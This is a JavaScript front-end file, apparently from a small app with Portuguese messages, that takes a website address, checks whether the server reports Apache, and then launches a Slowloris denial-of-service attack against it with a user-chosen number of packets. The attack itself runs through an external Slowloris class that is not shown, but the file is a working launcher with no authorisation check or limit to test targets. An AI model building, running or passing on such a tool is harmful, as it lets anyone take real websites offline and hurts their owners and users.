const MINIMUM_TEXT_INPUTTED = 3;

const inputs = [
    {
        selector: "#name",
        property: "name",
    },
    {
        selector: "#email",
        property: "email",
    },
    {
        selector: "#phone",
        property: "phone",
    },
];

const createCard = (result) => {
    try {
        $("#target").append(`
    <li class="item">
        <p class="card card-link">
            ${result}
        </p>
    </li>
    `)
    } catch (error) {
        console.log(error);
    }
}

const changeBorderColor = (id, hadResults) => {
    $(`.${id}_bottom_border`)[0].style.background = hadResults ? "#28a745" : "red"
    $(`.${id}_bottom_border`)[0].style.transform = "scaleX(1)"
}
const isAMatch = (val, val2) => val.toLowerCase().match(val2.toLowerCase())
const showResults = (results, selector, cardClass = ".item") => {
    $(selector).show();
    $(cardClass).remove();
    results.map(result => createCard(result))
}

const localhostData  = {
    data: "\n\napache"
}



const onSearch = async (event, inputConfig) => {
    try {
 const textSearched = document.getElementById('name').value;
    
    if (!textSearched ) return ;

    const searchedUrl = textSearched.match("http") ? textSearched : ("http://"+textSearched);

    const isLocalhost = searchedUrl.toLowerCase().match("http://localhost");
   const {
        data
    } = isLocalhost
    ? localhostData
    : await window.axios({
        url: window.url + searchedUrl,
    })

    const serverConfig = data.split("\n");

    const isServerVuln = serverConfig.find(config => config.toLowerCase().match("apache"));


    changeBorderColor("name", isServerVuln);
    changeBorderColor("packets", isServerVuln);

    if(!isServerVuln) return  showResults([`Site ${searchedUrl} nao e vulneravel a ataques Slowloris`], "logs")

    const numberOfPackets = document.getElementById("packets").value;

    const attack = new window.Slowloris(searchedUrl, numberOfPackets).attack();
 
    showResults([`Iniciando ataque em ${searchedUrl}, enviando ${numberOfPackets} pacotes`], "logs");

    window.attack = attack;

    new Promise((resolve) => attack.once('end', resolve)).then(() => {
        showResults(["Ataque finalizado "], "logs")
 
    }).catch(err => {

        showResults(["Erro no ataque, olhar no console para mais informacoes "], "logs");
        changeBorderColor("name", false);
        changeBorderColor("packets", false);
        console.log(err)

    });
    }
    catch(error) {

        showResults(["Erro no ataque, olhar no console para mais informacoes "], "logs");
        changeBorderColor("name", false);
        changeBorderColor("packets", false);
        console.log(error)

    }
   

}


[{
    selector: "#send-btn"
}].map(inputConfig => $(inputConfig.selector).on('click', (event) => onSearch(event)))


